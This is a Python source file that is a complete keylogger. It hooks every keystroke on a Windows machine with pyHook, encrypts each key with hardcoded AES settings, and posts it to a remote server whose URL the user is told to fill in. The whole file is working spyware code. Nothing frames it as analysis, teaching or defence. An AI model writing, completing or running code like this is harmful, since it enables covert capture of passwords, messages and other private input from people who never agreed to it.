import logging
import os
import pyHook
import pythoncom
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import base64
import requests

# Configure logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(message)s')
logger = logging.getLogger()

# AES encryption setup
KEY = b'sixteen byte key'  # 16 bytes for AES-128
IV = b'sixteen byte iv '   # 16 bytes for AES

def encrypt_message(message):
    # Padding
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(message) + padder.finalize()

    # Encrypt
    cipher = Cipher(algorithms.AES(KEY), modes.CBC(IV), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    # Encode to base64
    return base64.b64encode(encrypted_data).decode('utf-8')

def send_to_server(encrypted_data):
    url = "http://example.com/endpoint"  # Replace with your server URL
    try:
        response = requests.post(url, data={'data': encrypted_data})
        logger.debug("Data sent to server: %s", encrypted_data)
        logger.debug("Server response: %s", response.text)
    except Exception as e:
        logger.error("Error sending data to server: %s", e)

def on_keyboard_event(event):
    if event.Ascii:
        key = chr(event.Ascii)
        logger.debug("Key pressed: %s", key)
        
        # Encrypt the keystroke
        encrypted_data = encrypt_message(key.encode('utf-8'))
        
        # Send encrypted data to the server
        send_to_server(encrypted_data)
    
    return True

def main():
    # Create a hook manager
    hm = pyHook.HookManager()
    hm.KeyDown = on_keyboard_event
    hm.HookKeyboard()
    
    # Start the loop
    logger.info("Starting keyboard hook...")
    pythoncom.PumpMessages()

if __name__ == "__main__":
    main()